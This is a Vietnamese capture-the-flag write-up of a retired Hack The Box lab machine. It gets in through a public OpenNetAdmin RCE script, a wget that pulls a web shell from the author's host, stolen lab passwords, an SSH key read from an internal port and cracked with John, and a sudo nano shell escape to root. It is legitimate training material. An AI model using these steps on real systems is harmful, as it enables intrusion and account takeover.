## I. Let's Start
Đây là một machine mới được publish gần đây, được review khá tốt và được đánh giá phù hợp cho beginner. Được publish ngày 4/1/2020 và có IP là 10.10.10.171
![](https://images.viblo.asia/ed833416-a2f0-4274-921f-1be60bc958ff.png)

Mình đã viết Write-up bài này từ 8/1/2020, nhưng do policy của HTB là không được public những write-up về các machine đang Active nên giờ mình có thể đăng lên Viblo :D

## II. Overview
Về Matrix-Rate:
![](https://images.viblo.asia/386fe5fc-6207-4435-b4cd-98e5be406e95.png)


Khi nhìn vào matrix rate, chúng ta có thể dễ dàng nhận ra việc Enumeration có khả năng rất cao sẽ dẫn tới một CVE nào đó. Cùng với việc custom PoC sẽ không quá phức tạp.

Bước đầu khi đăng nhập vào IP của machine, đây chỉ là một default page của Apache và không có chức năng gì. Vậy khả năng cao việc Ports scan và brute-force để tìm directories và files sẽ được ưu tiên.

Giao diện đăng nhập ban đầu:

![](https://images.viblo.asia/d393833f-2210-456f-8d29-ef7ee98b7f4c.png)

## III. Write-up
### 1. User Flag
Scan ports và services bằng Nmap:
```
nmap -sV -Pn -F 10.10.10.171
```

Kết quả không khả quan cho lắm:

```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Cùng tìm xem có URLs nào thú vị không, mình sử dụng tool ưa thích là [Gobuster](https://github.com/OJ/gobuster). 

Ngoài ra nếu machine quá lag ( do machine mới, nhiều người chơi ), các bạn có thể sử dụng các tools khác như Dirbuster, Dirsearch, ...

Kết quả: Chúng ta có 2 route là /artwork/ và /music/ có HTTP status 301 và có nội dung. Khi truy cập vào http://10.10.10.171/music và chọn Login, chúng ta được redirect tới: http://10.10.10.171/ona/

![](https://images.viblo.asia/a15ff864-adf2-43d6-b749-a795aecd98ec.png)

Chúng ta có cả thông tin version **v18.1.1**, Google search ngay: "ona 18.1.1 vulnerabilities", ô kìa RCE:

![](https://images.viblo.asia/69de7bf0-e0ae-4d77-a3d7-77f97cd67aca.png)

Download script về và custom một chút, nếu run lỗi bad interpreter các bạn chạy: ```sed -i -e 's/\r$//' scriptname.sh```

![](https://images.viblo.asia/6a632213-3af8-4ed0-b9d1-25e92a308ab8.png)

Chạy script và bạn đã có thể RCE được dưới user www-data. Tại đây mình sẽ wget 1 shell khác để dễ thao tác hơn, cụ thể là p0wnyshell. Mình đổi tên để đỡ trùng tên với  shell user khác đã đẩy lên :D 

```
wget http://10.10.15.192:4567/nghiadz.php
```

Upload shell thành công, ta thấy có tới 2 user nhưng câu chuyện không đi tới đâu cả:

![](https://images.viblo.asia/cd84c7c8-e3bf-473a-8e79-f60d8fc86b6b.png)

Tại đây bắt buộc các bạn phải tìm tòi mày mò trong machine. Thông thường đó sẽ là password file, backup file, ssh information, config ... Kinh nghiệm tại đây là liệt kê các folder hay files mà user có privilege và ... tiếp tục tìm và cat, tìm và cat...

Cuối cung chúng ta tìm được 1 file settings và có một password bên trong: **n1nj4W4rri0R!**

![](https://images.viblo.asia/a6459806-6d0e-4710-8f66-366240af53d8.png)

Sử dụng nó và ssh tới machine dưới tên jimmy và thành công:

![](https://images.viblo.asia/862ab361-56c7-4cd0-a5fa-16378f5a7ebf.png)

Nhưng rất tiếc là user này không có flag, cũng đúng vì có tới 2 user, đây chắc là ý đồ của machine owner. Tái thực hiện bước "tìm và cat, tìm và cat, tìm và cat", ta nhận thấy trong thư mục /var/www/ ngoài /ona/ có thêm thư mục /internal/, cat main.php :

![](https://images.viblo.asia/34b0ebe2-a858-4c64-b02c-0f4c2053e501.png)

Đúng như cái tên là internal, chúng ta không thể truy cập được từ bên ngoài. Nhìn vào hình trên ta có thể thấy đây là 1 file dùng để đọc id_rsa của user joanna.

Hãy thử liệt kê các ports được mở trên machine:

![](https://images.viblo.asia/dbe67589-1543-49d2-86c4-d39e20dbf71a.png)

Vậy tại localhost có 2 port là 52846 và 3306 được mở, 3306 là mặc định của MySQL, do đo ta sẽ thử với 52846. Sử dụng Curl và chúng ta có được PRIVATE KEY của joanna:

```
curl http://localhost:52846/main.php
```
Lưu PRIVATE KEY vào pritave.txt. Có thể dùng nó để ssh với tên joanna tới machine, nhưng bị yêu cầu password.  Crack với John:

![](https://images.viblo.asia/499bff64-57c2-4132-aa6b-2b9aeaf96ce7.png)

Chúng ta có được password là: **bloodninjas**. Dùng nó để ssh dưới tên joanna và cat user flag:

![](https://images.viblo.asia/b4ba5e60-29b8-480d-a12e-fb18ceae4141.png)

### 2. Root Flag

Thông thường tới bước này, để cho nhanh chúng ta sẽ wget thêm 1 script nữa để Enumeration các thông tin trong Linux machine. Tuy nhiên có những thứ nhanh hơn và dễ dàng hơn: 

![](https://images.viblo.asia/eb6c45c4-17fd-42e0-b1be-5c49a3bed8a9.png)

Một khi đã có nano thì có rất nhiều cách để get Root. Dưới đây là một trong số đó:

Exploit:

```
sudo nano /opt/priv : Không yêu cầu password :D
Ctrl + R =&gt; Ctrl + X : Để Execute command
Command: reset; sh 1>&0 2>&0 và ấn Enter
```

Kết quả như hình bên dưới (Ở đây mình chỉ dùng 1>&0):

![](https://images.viblo.asia/f2d17ed2-7aa0-4324-ad88-b0da0bdc6e49.png)

Và thành công, đã có Root Flag :D

## IV. Tổng kết
Machine không quá khó, nhưng qua machine này chúng ta biết thêm được 1 "kiểu lỗi" khác đó là mở internal port, là một hướng làm có thể nghĩ tới khi gặp các machine. Cách leo root thì khá cơ bản với Sudo Rights. Các bạn có thể đọc bài viết chi tiết mình đã viết tại [đây](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights-3Q75w8x2KWb).

Have fun !